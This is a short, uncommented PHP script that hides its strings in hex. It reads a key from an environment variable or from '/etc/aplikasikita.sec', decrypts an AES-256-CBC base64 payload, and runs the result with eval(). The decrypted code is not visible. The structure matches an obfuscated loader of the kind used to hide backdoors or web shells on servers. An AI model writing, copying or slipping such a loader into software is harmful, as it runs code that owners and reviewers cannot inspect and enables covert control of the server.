<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ewzHRftYaBWpVqTCppMYwQ==');

$c=base64_decode(

'KRab1lIFyBwtWTYWmK1yfk5uO++Kmk7DVaTFDbL9gUfv3m2WQAjLfNGYNqrNr1ved9PKLBDNnXYK' .
'ckg0bgMDf9XnVACVBwed0WOYHhpkbk2TLjhOrz9KTm1Lj5QU56F7Wo9zCfjf3IF5N6JVA2Rlc6lN' .
'aCG2w9jNhEqNjc8Q2jl8ePB7qS/tG5p6g2CvGYrZhU33VTFXbNug4CdtIococ7Nfq1S+miKA5lNm' .
'Jpf9kcsqDpGca9N4mqRRLUv6RqZviqu2xatZZLpOQjL/RwnfYDvw8Y6rSNwMXfvA6jAohPX8T5eT' .
'jFaXZo5UYsKW8YIOGNK83HUsH9CBXIWEyeDwI+jUXDHrCucXbKlnjNKUb092b0qXkEsuIEC86Ql+' .
'bglewfEPt+x1Dc4eio9kWBdgYFpwDWDe/p23V0HoMkIrd+CBCxFz1D3Cr0Yi8ZV+Yvj/zGGPbfOH' .
'Ob+5Hx859tVMcnra8yXOcSEA6xrgL1aheZBGovQkW7TVCo2IS33vTfVKDO9sNL5E2EfYAjbuCrww' .
'+HpovtqTX1mjJfgN+LyoA4M='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

